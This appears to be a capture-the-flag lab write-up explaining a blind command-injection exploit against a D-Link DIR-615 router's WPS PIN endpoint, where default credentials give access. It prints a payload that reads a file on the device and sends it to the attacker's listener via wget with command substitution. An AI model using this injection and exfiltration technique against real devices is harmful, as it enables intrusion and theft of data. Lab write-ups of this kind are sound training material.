# 1. Vulnerability Overview for Royal Router

The core of this exploit is a Command Injection vulnerability within the D-Link DIR-615 firmware (version 3.03WW). Specifically, the endpoint set_sta_enrollee_pin.cgi processes the parameter wps_sta_enrollee_pin without adequate sanitization. In Linux-based IoT devices, this often means the input is passed directly into a system call (like system() or popen()), allowing an attacker to break out of the intended logic and execute shell commands.
# 2. Identifying the Attack Vector

    Target Device: D-Link DIR-615, Hardware C2, Firmware 3.03WW.

    Initial Access: The device used default credentials (admin with a blank password).

    Vulnerable Page: The do_wps.asp page handles Wi-Fi Protected Setup (WPS) configurations.

    The Flaw: By intercepting the POST request to the CGI script, we can replace a standard PIN with shell metacharacters (backticks ` or $()).

# 3. Script Logic & Execution Flow

Your script automates a complex "Blind" exfiltration technique. Because the router’s web server doesn't show command output on the screen, the script creates its own "phone home" mechanism.
## Phase A: The Listener (The "Receiver")

The script initiates a multi-threaded Python HTTP server on your Kali machine.

    Purpose: It waits for the router to reach out via the network.

    Evidence: In your output, this is represented by: [*] Local server listening on 192.168.155.45:80...

## Phase B: The Payload (The "Trigger")

The script sends a crafted POST request containing the following payload: `wget http://192.168.155.45/$(cat /root/flag.txt)`.

    cat /root/flag.txt: This command runs on the router and reads the flag.

    $(...): This is command substitution. It takes the text of the flag and places it into the URL.

    wget: The router then tries to "download" a file from your machine using the flag as the filename.

## Phase C: Exfiltration (The "Catch")

When the router executes the wget command, your script's listener logs the incoming request.

    Detection: The script uses a regular expression to look for the THM{...} pattern in the URL path.

    Evidence: [+] Incoming connection from 10.81.153.8 followed by [*] EXFILTRATED FLAG: THM{EXFILTRATING_A_MIPS_ROUTER}.

# 4. Why This Approach Was Necessary

Standard exploitation often involves a Reverse Shell, but in many IoT environments (especially MIPS architecture), traditional shells like /bin/bash are missing, or netcat is not installed. By using wget, which is a common utility on almost all firmware, we bypassed these limitations to exfiltrate the data over the HTTP protocol.

Final Flag Recovered: THM{EXFILTRATING_A_MIPS_ROUTER}
